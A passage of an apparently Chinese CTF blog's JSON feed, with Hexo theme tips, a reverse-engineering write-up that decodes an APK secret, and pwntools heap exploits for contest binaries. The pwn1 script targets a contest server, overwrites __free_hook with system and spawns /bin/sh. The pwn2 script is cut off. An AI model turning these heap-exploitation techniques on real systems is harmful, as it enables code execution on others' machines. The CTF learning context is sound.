不必要改绝对路径</p>\n<p><code> const live2d_path = &quot;https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/&quot;; //const live2d_path = &quot;/live2d-widget/&quot;;</code>  这行注释掉</p>\n<p>然后进入主题下的 /layout/_partials/head/head.njk 里面的最后几行代码修改为</p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/rss+xml\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼4<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"&lt;<span class=\"token tag\">!--swig</span>￼5<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/atom+xml\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼6<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"&lt;<span class=\"token tag\">!--swig</span>￼7<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/json\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼8<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"&lt;<span class=\"token tag\">!--swig</span>￼9<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/json\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼10<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"https<span class=\"token punctuation\">:</span>//cdn.jsdelivr.net/npm/font<span class=\"token punctuation\">-</span>awesome/css/font<span class=\"token punctuation\">-</span>awesome.min.css\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>&lt;script async src=\"https<span class=\"token punctuation\">:</span>//cdn.jsdelivr.net/gh/stevenjoezhang/live2d<span class=\"token punctuation\">-</span>widget@latest/autoload.js\"<span class=\"token punctuation\">></span>&lt;/script<span class=\"token punctuation\">></span></pre></td></tr></table></figure><p>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</p>\n<h2 id=\"利用本地资源\"><a class=\"anchor\" href=\"#利用本地资源\">#</a> 利用本地资源</h2>\n<p>整个文件夹 live2d-widget 放到 /source/js 文件夹里面</p>\n<p>autoload.js 的路径默认就行，也可以改本地，不影响。</p>\n<p>然后进入主题下的 /layout/_partials/head/head.njk 里面的最后几行代码修改为</p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/rss+xml\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼11<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"&lt;<span class=\"token tag\">!--swig</span>￼12<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/atom+xml\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼13<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"&lt;<span class=\"token tag\">!--swig</span>￼14<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/json\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼15<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"&lt;<span class=\"token tag\">!--swig</span>￼16<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/json\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼17<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"https<span class=\"token punctuation\">:</span>//cdn.jsdelivr.net/npm/font<span class=\"token punctuation\">-</span>awesome/css/font<span class=\"token punctuation\">-</span>awesome.min.css\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>&lt;<span class=\"token tag\">!--swig</span>￼18<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span></pre></td></tr></table></figure><p>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</p>\n<p>本地搭建是区别网上另一种方法，かねき けん师傅 tql</p>\n<p>我 debug 的时候报的 js 渲染错误，后来发现是 minify (十个亚压缩插件，减少文件大小) 的问题，注释掉，<s>搅屎棍</s>。</p>\n<h3 id=\"看板娘的模块问题\"><a class=\"anchor\" href=\"#看板娘的模块问题\">#</a> 看板娘的模块问题</h3>\n<p>个人认为 shoka 处理的不是很好，依赖项没怎么更新，也没有回复，插件的压缩依赖项没有及时支持 es6 规范，用 shoka 主题个人认为不推荐搞模块，大佬除外。</p>\n<h1 id=\"关于背景图片的问题\"><a class=\"anchor\" href=\"#关于背景图片的问题\">#</a> 关于背景图片的问题</h1>\n<p>背景图片有两处地方一个是主题下的_images.yml 文件，还有一个是根目录下的 /source/__data 下的 images.yml</p>\n<p>修改 source/__data 下的 images.yml 即可覆盖背景图，要 6 个以上，6 个以内好像有 bug。</p>\n<p>推荐使用 cdn，jsdelivr 来加速图片，创建图床，免费使用</p>\n<h1 id=\"一些基础的细节改shoka主题可以去大佬博客reversesacle添加功能魔改博客很详细-迭代中\"><a class=\"anchor\" href=\"#一些基础的细节改shoka主题可以去大佬博客reversesacle添加功能魔改博客很详细-迭代中\">#</a> 一些基础的细节，改 shoka 主题可以去大佬博客<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmV2ZXJzZXNhY2xlLmNvbS9IZXhvLVNob2thJUU0JUI4JUJCJUU5JUEyJTk4JUU1JThBJTlGJUU4JTgzJUJEJUU0JUJCJThCJUU3JUJCJThEJUU4JUExJUE1JUU1JTg1JTg1JUU3JTgyJUI5Lw==\"> ReverseSacle</span>，添加功能，魔改博客，很详细。迭代中........</h1>\n",
            "tags": [
                "计算机科学",
                "CTF",
                "Reverse",
                "CTF"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/reverse/",
            "url": "https://zephyr-cyber.github.io.git/reverse/",
            "title": "学习Reverse",
            "date_published": "2021-12-01T01:05:47.265Z",
            "content_html": "<p>2021/10/21 更新了 REVERSE1-schoolboy.apk</p>\n<h1 id=\"antidebug\"><a class=\"anchor\" href=\"#antidebug\">#</a> Antidebug</h1>\n<p>使用 resource hacker 获得输入框的 id：<br />\n<img data-src=\"/img/reverse/antidebug1.jpg\" alt=\"avatar\" /></p>\n<p>用 ida 搜索立即数，可以搜索 0x3e8  可以直接搜索 1000：<br />\n<img data-src=\"/img/reverse/antidebug2.jpg\" alt=\"avatar\" /></p>\n<p>双击找到调用位置:<br />\n 发现有 jz 和 jnz 跳转到相同位置，初步怀疑这里有花指令影响了 ida 的正常运行：<br />\n<img data-src=\"/img/reverse/antidebug3.jpg\" alt=\"avatar\" /></p>\n<p>key path -&gt; Fill range 全部 pathc 为 nop。注意 00401524 是个多字节指令，先使用快捷键 d 转为数据，将 00401524patch 为 0x90 后，再将后边的使用快捷键 c 转为代码：<br />\n<img data-src=\"/img/reverse/antidebug4.jpg\" alt=\"avatar\" /></p>\n<p>在找到函数开始的位置 push ebp 的地方，右键 create function<br />\nF5 可以看到是固定判断，只要输入的值是 0xABCDDCBA  ，那也就是个数字了。<br />\n即 2882395322 就可以了。<br />\n<img data-src=\"/img/reverse/antidebug5.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"reverse1-schoolboyapk\"><a class=\"anchor\" href=\"#reverse1-schoolboyapk\">#</a> REVERSE1-schoolboy.apk</h1>\n<p>REVERSE1-schoolboy.apk<br />\nApk 文件反編譯<br />\n用一些 jeb jadx apkIDE 都可以<br />\n Jeb 和 apkIDE 搜索方便一點<br />\n Jadx 快一點</p>\n<p>我用的 apkIDE 和 jeb<br />\n 搜索 mainactivity<br />\n<img data-src=\"/img/reverse/reverseschoolboy1.jpg\" alt=\"avatar\" /></p>\n<p>反編譯<br />\n<img data-src=\"/img/reverse/reverseschoolboy2.jpg\" alt=\"avatar\" /></p>\n<p>找到主要内容<br />\n Id 號為 0x7F0E005D<br />\nGetStrings 方法<br />\n<img data-src=\"/img/reverse/reverseschoolboy3.jpg\" alt=\"avatar\" /></p>\n<p>用 smail 全局搜索 id 號得到<br />\n<img data-src=\"/img/reverse/reverseschoolboy4.jpg\" alt=\"avatar\" /></p>\n<p>Id 號為<br />\n<img data-src=\"/img/reverse/reverseschoolboy5.jpg\" alt=\"avatar\" /></p>\n<p>在 mysecret 裏面<br />\n搜索 strings.xml<br />\nresources.arsc-res-values-strings.xml<br />\n<img data-src=\"/img/reverse/reverseschoolboy6.jpg\" alt=\"avatar\" /></p>\n<p>找到 mysecret<br />\n<img data-src=\"/img/reverse/reverseschoolboy7.jpg\" alt=\"avatar\" /></p>\n<p>EBRQFBDfWY5MDgzOj9vbiNzdCcicXBxeiwteS0vfHtDQhZAFRwfWggJCgsMDQ4P<br />\n 看上去像加密的<br />\n寫脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token string\">\"REBRQFBDfWY5MDgzOj9vbiNzdCcicXBxeiwteS0vfHtDQhZAFRwfWggJCgsMDQ4P\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>b <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p a192862aa3bf46dffb57b12bdcc4c199=\"\"><img data-src=\"/img/reverse/reverseschoolboy8.jpg\" alt=\"avatar\" /><br />\n 直接出<br />\n flag:<br />\nDASCTF</p>\n",
            "tags": [
                "计算机科学",
                "CTF",
                "Reverse",
                "CTF",
                "Reverse"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/pwn2/",
            "url": "https://zephyr-cyber.github.io.git/pwn2/",
            "title": "pwn学习(2)",
            "date_published": "2021-12-01T01:05:47.250Z",
            "content_html": "<h1 id=\"记录两个堆的比赛题\"><a class=\"anchor\" href=\"#记录两个堆的比赛题\">#</a> 记录两个堆的比赛题</h1>\n<p>比较穷网盘没有会员附件私聊我</p>\n<h1 id=\"pwn1\"><a class=\"anchor\" href=\"#pwn1\">#</a> pwn1</h1>\n<p><img data-src=\"/img/PWN/zhiye2.png\" alt=\"avatar\" /></p>\n<p><img data-src=\"/img/PWN/zhiye.png\" alt=\"avatar\" /><br />\n 堆溢出<br />\n感觉比较基础<br />\n堆溢出改大小制造重叠堆块</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#io=process('./pwn1')</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>io<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'119.61.19.212'</span><span class=\"token punctuation\">,</span><span class=\"token number\">57511</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>elf<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.31.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#libc=elf.libc</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'content: '</span><span class=\"token punctuation\">,</span>context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">exp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x80</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x481</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tshow<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\tmalloc_hook<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">96</span><span class=\"token operator\">-</span><span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tlibc_base<span class=\"token operator\">=</span>malloc_hook<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'libc_base'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tsystem<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tfree_hook<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#10</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x80</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">91</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>free_hook<span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token comment\">#gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>exp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn2\"><a class=\"anchor\" href=\"#pwn2\">#</a> pwn2</h1>\n<p>比赛就两小时<br />\n想办法绕过这有点麻烦<br />\n<img data-src=\"/img/PWN/zhiye3.png\" alt=\"avatar\" /><br />\n 最后复现出来<br />\n exp：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>io<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>elf<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>libc<span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>libc</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'size: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">'content: '</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">exp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0~3</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#4~5</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\tdele<span class=\"token 